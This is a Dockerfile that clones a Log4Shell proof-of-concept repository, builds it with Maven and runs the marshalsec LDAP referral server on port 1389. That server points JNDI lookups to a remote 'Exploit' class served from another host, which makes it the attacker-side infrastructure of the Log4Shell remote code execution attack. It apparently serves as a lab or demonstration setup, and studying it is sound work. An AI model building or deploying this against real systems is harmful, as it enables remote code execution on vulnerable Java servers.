FROM alpine:latest

RUN apk update
RUN apk add openjdk11
RUN apk add git
RUN apk add maven

RUN cd opt &&\
    git clone https://github.com/sgwgsw/Log4Shell_PoC.git

RUN cd /opt/Log4Shell_PoC/ldap_server &&\
    mvn clean package -DskipTests

WORKDIR /opt/Log4Shell_PoC/ldap_server/target

EXPOSE 1389

CMD ["java", "-cp", "ldap_server-1.0-all.jar", "marshalsec.jndi.LDAPRefServer", "http://http_server:8889/#Exploit"]
